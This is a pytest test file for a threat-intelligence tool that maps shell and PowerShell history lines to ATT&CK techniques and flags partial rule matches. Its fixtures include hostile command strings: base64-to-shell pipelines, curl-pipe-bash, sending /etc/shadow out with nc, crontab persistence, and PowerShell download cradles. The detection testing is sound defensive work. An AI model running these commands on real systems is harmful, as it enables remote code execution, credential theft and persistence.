"""A rule gloss describes the command the rule matched. When the line also runs something the rule does not describe,
such as a later pipeline stage that runs a shell, the gloss is marked partial and the line still goes to the model."""

import pytest

from interlinear_cti import cli
from interlinear_cti.glossing import apply_glosses, apply_rules, pending_lines
from interlinear_cti.model import load
from interlinear_cti.render import render_markdown
from interlinear_cti.rules import load_library

AT = "2026-10-22T00:00:00Z"
MODEL = "claude-haiku-5-5"


def glossed(parse_text, resolver, text, name=".bash_history"):
    transcript = parse_text(name, text)
    apply_rules(transcript, load_library(resolver=resolver), at=AT)
    return transcript


def test_decode_pipe_shell_names_both_the_decode_and_the_shell(parse_text, resolver):
    line = glossed(parse_text, resolver, "echo aWQ= | base64 -d | bash\n").lines[0]
    assert line.gloss.rule_id == "decode-pipe-shell"
    assert [t.id for t in line.gloss.techniques] == ["T1140", "T1059.004"]
    assert line.gloss.partial is None


@pytest.mark.parametrize("text", [
    "echo aWQ= | base64 --decode | sh",
    "base64 -d <<< aWQ= | bash",
    "cat p.b64 | base64 -di | sudo bash -",
    "echo aWQ= | base64 -D | zsh",
])
def test_decode_pipe_shell_forms(parse_text, resolver, text):
    assert glossed(parse_text, resolver, text + "\n").lines[0].gloss.rule_id == "decode-pipe-shell"


@pytest.mark.parametrize("text, word", [
    ("python3 gen.py | base64 -d", "python3"),
    ('bash -c "$(echo aWQ= | base64 -d)"', "bash"),
    ("echo aWQ= | base64 -d | xargs -I{} sh -c '{}'", "xargs"),
    ("cat /etc/shadow | nc 203.0.113.5 4444", "nc"),
    ("echo aWQ= | base64 -d | perl", "perl"),
    ("(crontab -r; echo '*/5 * * * * /tmp/.x') | crontab -", "crontab"),
])
def test_a_command_the_rule_does_not_describe_marks_the_gloss_partial(parse_text, resolver, text, word):
    gloss = glossed(parse_text, resolver, text + "\n").lines[0].gloss
    assert gloss.source == "rule" and gloss.techniques
    assert gloss.partial is not None and word in gloss.partial


@pytest.mark.parametrize("text", [
    "echo aWQ= | base64 -d",
    "cat /etc/shadow | grep root",
    "curl -s http://203.0.113.5/x.sh | bash",
    "bash <(curl -s http://203.0.113.5/x.sh)",
    "sudo cat /etc/shadow | head -5 | sort",
    "whoami",
    "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.s2') | crontab -",
    "(crontab -u root -l; echo '@reboot /tmp/.s2') | crontab -u root -",
])
def test_a_line_the_rule_describes_whole_is_not_partial(parse_text, resolver, text):
    gloss = glossed(parse_text, resolver, text + "\n").lines[0].gloss
    assert gloss.source == "rule" and gloss.partial is None


# A download cradle already says the code runs: the URL in DownloadString(...) or a variable in it is part of the
# cradle, not another command (0.1.1 marked these partial). A later pipeline stage is still another command (a
# statement after ; is a line of its own).
CRADLE = "IEX (New-Object Net.WebClient).DownloadString("


@pytest.mark.parametrize("text", [
    CRADLE + "'http://203.0.113.5/a.ps1')",
    CRADLE + '"http://$ip/a.ps1")',
    "IEX(New-Object Net.WebClient).DownloadString($u)",
    "iex (irm https://example.com/p.ps1)",
    "iwr https://example.com/p.ps1 -UseBasicParsing | iex",
    "IEX (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing).Content",
])
def test_a_powershell_cradle_is_not_partial(parse_text, resolver, text):
    gloss = glossed(parse_text, resolver, text + "\n", name="ConsoleHost_history.txt").lines[0].gloss
    assert gloss.rule_id == "powershell-download-cradle" and gloss.partial is None, gloss.partial


@pytest.mark.parametrize("text, word", [
    (CRADLE + "'http://203.0.113.5/a.ps1') | Out-File C:/Users/Public/o.txt", "out-file"),
    ("iwr https://example.com/p.ps1 | iex | Set-Content o.txt", "set-content"),
])
def test_a_command_after_a_powershell_cradle_is_still_partial(parse_text, resolver, text, word):
    gloss = glossed(parse_text, resolver, text + "\n", name="ConsoleHost_history.txt").lines[0].gloss
    assert gloss.rule_id == "powershell-download-cradle" and word in (gloss.partial or ""), gloss.partial


def test_a_partial_reason_never_echoes_odd_command_text(parse_text, resolver):
    gloss = glossed(parse_text, resolver, "echo aWQ= | base64 -d | ./'<b>x</b>'\n").lines[0].gloss
    assert gloss.partial is not None and "<" not in gloss.partial and "another command" in gloss.partial


def test_partial_lines_are_listed_as_pending_with_what_the_rule_found(parse_text, resolver):
    transcript = glossed(parse_text, resolver, "python3 gen.py | base64 -d\necho aWQ= | base64 -d\nfrobnicate\n")
    rows = pending_lines(transcript)
    assert [row["n"] for row in rows] == [1, 3]
    assert rows[0]["rule"] == {"id": "base64-decode", "techniques": ["T1140"],
                               "partial": transcript.lines[0].gloss.partial}
    assert "rule" not in rows[1]


def test_a_model_gloss_replaces_a_partial_rule_gloss_which_moves_to_history(parse_text, resolver):
    transcript = glossed(parse_text, resolver, "python3 gen.py | base64 -d\n")
    entry = {"n": 1, "meaning": "Runs a generator and decodes its output.", "techniques": ["T1059.006", "T1140"],
             "confidence": "medium"}
    applied, rejected = apply_glosses(transcript, [entry], source="model", by=MODEL, resolver=resolver, at=AT)
    assert (applied, rejected) == (1, [])
    line = transcript.lines[0]
    assert line.gloss.source == "model" and line.gloss.partial is None
    assert [g.rule_id for g in line.history] == ["base64-decode"]
    assert pending_lines(transcript) == []


def test_a_model_gloss_still_never_replaces_a_whole_rule_gloss(parse_text, resolver):
    transcript = glossed(parse_text, resolver, "echo aWQ= | base64 -d\n")
    entry = {"n": 1, "meaning": "x", "techniques": ["T1140"], "confidence": "low"}
    _, rejected = apply_glosses(transcript, [entry], source="model", by=MODEL, resolver=resolver, at=AT)
    assert rejected == ["line 1: already glossed (rule); model glosses only fill pending lines"]


def test_render_marks_a_partial_rule_gloss(parse_text, resolver):
    transcript = glossed(parse_text, resolver, "python3 gen.py | base64 -d\n")
    view = render_markdown(transcript)
    assert "[rule: base64-decode; partial]" in view
    assert "partial: " + transcript.lines[0].gloss.partial in view
    assert "1 rule (1 partial)" in view


def test_cli_gloss_counts_partial_rule_glosses(tmp_path, monkeypatch, resolver, capsys):
    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: resolver)
    history = tmp_path / ".bash_history"
    history.write_bytes(b"python3 gen.py | base64 -d\nwhoami\n")
    path = tmp_path / "transcript.json"
    assert cli.main(["parse", str(history), "-o", str(path)]) == 0
    capsys.readouterr()
    assert cli.main(["gloss", str(path)]) == 0
    out = capsys.readouterr().out
    assert "2 rule (1 partial, also left to the model)" in out
    assert load(path).lines[0].gloss.partial
